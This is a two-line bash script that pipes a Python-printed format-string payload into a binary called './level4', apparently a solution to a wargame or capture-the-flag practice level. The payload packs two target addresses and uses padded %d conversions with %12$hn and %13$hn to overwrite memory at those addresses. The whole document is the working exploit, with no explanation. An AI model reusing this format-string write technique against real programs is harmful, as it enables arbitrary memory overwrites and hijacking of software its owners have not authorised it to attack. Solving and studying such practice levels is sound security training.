#!/bin/bash
python -c "print('\x12\x98\x04\x08' + '\x10\x98\x04\x08' + '%250d' + '%12\$hn' + '%21570d' + '%13\$hn')" | ./level4
